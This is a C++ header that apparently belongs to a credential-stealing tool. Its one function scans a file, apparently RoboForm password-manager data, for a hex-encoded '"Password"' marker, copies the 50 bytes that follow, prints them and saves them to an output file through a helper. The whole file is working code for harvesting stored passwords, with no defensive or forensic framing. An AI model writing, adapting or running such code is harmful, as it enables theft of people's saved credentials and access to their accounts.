#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include "../../core/saveFile.h"

int getCredsroboformappentries1(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    std::vector<unsigned char> searchPattern = { 0x22, 0x50, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x22 };
    std::vector<unsigned char> foundData;

    while (!file.eof()) {
        char c;
        file.get(c);

        if (c == searchPattern[foundData.size()]) {
            foundData.push_back(c);
            if (foundData.size() == searchPattern.size()) {
                // We found the search sequence, now collect the next 50 binary characters
                std::vector<char> extractedData;
                for (int i = 0; i < 50; i++) {
                    file.get(c);
                    if (file.eof()) {
                        break;
                    }
                    extractedData.push_back(c);
                }

                // Print the extracted data as UTF-8
                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;  // Add a newline

                //Save data into a file
                saveFile(utf8ExtractedData + "\n");

                // Clear the foundData vector to search for the next occurrence
                foundData.clear();
            }
        }
        else {
            foundData.clear();
        }
    }

    file.close();
    return 0;
}
